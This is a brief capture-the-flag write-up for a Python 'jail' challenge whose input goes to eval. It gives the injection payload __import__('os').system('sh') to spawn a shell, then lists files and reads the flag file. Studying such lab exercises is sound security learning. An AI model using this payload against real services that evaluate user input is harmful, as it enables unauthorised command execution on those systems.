# Baby jail 1

## Write-up 
In this challenge, we see that if we give an airthetmic operation it will get evaluated.

```

>> 1+1

1+1 --> 2

```

Since we know that the app is built using Python from the description of the challenge, we can assume that the author has used the function `eval` in order to evaluate the expression. This function can be dangerous since it interprets Python code too, thus allowing us to execute whatever we want.

```

__import__('os').system('sh')

ls

cat flag.txt

```

## Flag

`shellmates{D0n'7_m3$$_W17H_EVAL_kID0}`